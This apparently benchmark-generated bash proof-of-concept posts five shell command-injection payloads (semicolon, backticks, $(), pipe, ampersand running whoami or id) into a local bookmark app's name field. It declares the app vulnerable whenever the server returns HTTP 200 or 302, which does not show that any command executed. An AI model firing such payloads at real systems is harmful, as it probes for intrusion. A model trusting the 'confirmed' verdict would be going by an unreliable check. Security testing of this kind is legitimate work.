#!/bin/bash
# POC: Command Injection in Bookmark Name Field v2 - Demonstrates acceptance of command injection payloads with proper session management
# Target: ./repo
# Created: 2025-12-02T16:23:49.146Z
# Session: benchmark-XBEN-075-24-miorxjbp

# Command Injection Vulnerability POC - Bookmark Name Field (v2)
# This script tests whether the application accepts command injection payloads
# in the bookmark name field without filtering
# Uses cookies to maintain session state

TARGET_BASE="http://localhost:5000"
TARGET_ADD="$TARGET_BASE/add"
TARGET_LIST="$TARGET_BASE/list"
TEST_URL="https://example.com"
COOKIE_JAR="/tmp/cookies_$RANDOM.txt"

echo "[*] Testing Command Injection in Bookmark Name Field"
echo "[*] Target: $TARGET_ADD"
echo ""

# First, access the list page to establish a session
echo "[*] Establishing session..."
curl -s -X GET "$TARGET_LIST" -c "$COOKIE_JAR" > /dev/null
echo "[+] Session established"
echo ""

# Test 1: Command injection with semicolon
echo "[Test 1] Payload: test;whoami"
RESPONSE1=$(curl -s -X POST "$TARGET_ADD" \
  -b "$COOKIE_JAR" \
  -d "name=test;whoami&url=$TEST_URL" \
  -w "\n%{http_code}")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n -1)
echo "HTTP Response Code: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "200" ] || [ "$HTTP_CODE1" = "302" ]; then
  echo "✓ VULNERABLE: Command injection payload accepted (HTTP $HTTP_CODE1)"
else
  echo "Response body excerpt:"
  echo "$BODY1" | head -c 200
fi
echo ""

# Test 2: Command injection with backticks
echo "[Test 2] Payload: test\`id\`"
RESPONSE2=$(curl -s -X POST "$TARGET_ADD" \
  -b "$COOKIE_JAR" \
  -d "name=test\`id\`&url=$TEST_URL" \
  -w "\n%{http_code}")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n -1)
echo "HTTP Response Code: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "302" ]; then
  echo "✓ VULNERABLE: Backtick command substitution accepted (HTTP $HTTP_CODE2)"
else
  echo "Response: $HTTP_CODE2"
fi
echo ""

# Test 3: Command injection with $()
echo "[Test 3] Payload: test\$(whoami)"
RESPONSE3=$(curl -s -X POST "$TARGET_ADD" \
  -b "$COOKIE_JAR" \
  -d "name=test\$(whoami)&url=$TEST_URL" \
  -w "\n%{http_code}")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n -1)
echo "HTTP Response Code: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "200" ] || [ "$HTTP_CODE3" = "302" ]; then
  echo "✓ VULNERABLE: Dollar-parenthesis command substitution accepted (HTTP $HTTP_CODE3)"
else
  echo "Response: $HTTP_CODE3"
fi
echo ""

# Test 4: Command injection with pipe
echo "[Test 4] Payload: test | id"
RESPONSE4=$(curl -s -X POST "$TARGET_ADD" \
  -b "$COOKIE_JAR" \
  -d "name=test | id&url=$TEST_URL" \
  -w "\n%{http_code}")
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n -1)
echo "HTTP Response Code: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "200" ] || [ "$HTTP_CODE4" = "302" ]; then
  echo "✓ VULNERABLE: Pipe operator accepted (HTTP $HTTP_CODE4)"
else
  echo "Response: $HTTP_CODE4"
fi
echo ""

# Test 5: Command injection with ampersand
echo "[Test 5] Payload: test & whoami"
RESPONSE5=$(curl -s -X POST "$TARGET_ADD" \
  -b "$COOKIE_JAR" \
  -d "name=test & whoami&url=$TEST_URL" \
  -w "\n%{http_code}")
HTTP_CODE5=$(echo "$RESPONSE5" | tail -n1)
BODY5=$(echo "$RESPONSE5" | head -n -1)
echo "HTTP Response Code: $HTTP_CODE5"
if [ "$HTTP_CODE5" = "200" ] || [ "$HTTP_CODE5" = "302" ]; then
  echo "✓ VULNERABLE: Ampersand operator accepted (HTTP $HTTP_CODE5)"
else
  echo "Response: $HTTP_CODE5"
fi
echo ""

# Clean up
rm -f "$COOKIE_JAR"

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo "Command injection payloads acceptance test"
echo ""
echo "HTTP Response Codes:"
echo "  Test 1 (semicolon): $HTTP_CODE1"
echo "  Test 2 (backticks): $HTTP_CODE2"
echo "  Test 3 (dollar-paren): $HTTP_CODE3"
echo "  Test 4 (pipe): $HTTP_CODE4"
echo "  Test 5 (ampersand): $HTTP_CODE5"
echo ""

# Check if any payload was accepted
if [ "$HTTP_CODE1" = "200" ] || [ "$HTTP_CODE1" = "302" ] || \
   [ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "302" ] || \
   [ "$HTTP_CODE3" = "200" ] || [ "$HTTP_CODE3" = "302" ] || \
   [ "$HTTP_CODE4" = "200" ] || [ "$HTTP_CODE4" = "302" ] || \
   [ "$HTTP_CODE5" = "200" ] || [ "$HTTP_CODE5" = "302" ]; then
  echo "✓ VULNERABILITY CONFIRMED: Command injection payloads are accepted"
  exit 0
else
  echo "✗ No command injection payloads were accepted"
  exit 1
fi